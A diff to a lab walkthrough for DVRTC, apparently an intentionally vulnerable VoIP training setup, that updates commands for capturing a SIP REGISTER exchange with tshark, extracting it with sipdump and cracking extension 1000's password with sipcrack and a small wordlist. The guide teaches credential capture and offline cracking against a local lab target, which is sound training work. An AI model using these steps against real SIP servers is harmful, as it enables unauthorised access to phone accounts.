@@ -6,7 +6,7 @@ Capture a legitimate SIP authentication exchange for extension `1000`, extract t
 
 ## Prerequisites
 
-- DVRTC running: `docker compose up -d`
+- DVRTC running: `./scripts/compose.sh --scenario pbx1 up -d`
 - `tshark`, `sipdump`, `sipcrack`, and `dvrtc-checks` available in the `testing` service
 
 ## Steps
@@ -16,7 +16,7 @@ Capture a legitimate SIP authentication exchange for extension `1000`, extract t
 Run on the host:
 
 ```bash
-docker compose run --rm -it testing bash
+./scripts/compose.sh --scenario pbx1 run --rm testing bash
 cd /work
 ```
 
@@ -34,7 +34,7 @@ The capture and extracted files are written to `artifacts/` in the repository ro
 Run on the host (in a second terminal):
 
 ```bash
-docker compose run --rm -it testing bash
+./scripts/compose.sh --scenario pbx1 run --rm testing bash
 cd /work
 ```
 
@@ -42,6 +42,7 @@ In the second testing shell:
 
 ```bash
 dvrtc-checks register --host 127.0.0.1 --local-port 5070 --register-only
+exit
 ```
 
 This generates a normal authenticated `REGISTER` flow for `1000:1500` from local source port `5070`.
@@ -66,7 +67,7 @@ In the first testing shell:
 printf '1234\npassword\nadmin\n1000\n1500\n' > candidates.txt
 ```
 
-### Step 5: Verify
+### Step 5: Run sipcrack against the captured login
 
 In the first testing shell:
 
@@ -74,7 +75,11 @@ In the first testing shell:
 sipcrack -w candidates.txt register-auth-1000
 ```
 
-When `sipcrack` prompts you to select an entry, enter `1`. Look for `Found password: '1500'`.
+When `sipcrack` prompts you to select an entry, enter `1`. Look for `Found password: '1500'`. Then exit the testing shell:
+
+```bash
+exit
+```
 
 > **Troubleshooting:** If `sipdump` reports no logins found, re-run steps 1 and 2, making sure the `REGISTER` in step 2 completes before the 30-second `tshark` capture ends.
 
